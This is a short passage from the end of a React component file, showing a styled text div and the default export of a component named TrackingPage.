        <div style={{ color: 'rgba(255,255,255,0.5)', fontSize: '0.9rem', lineHeight: 1.5 }}>{a}</div>
    </div>
);

export default TrackingPage;
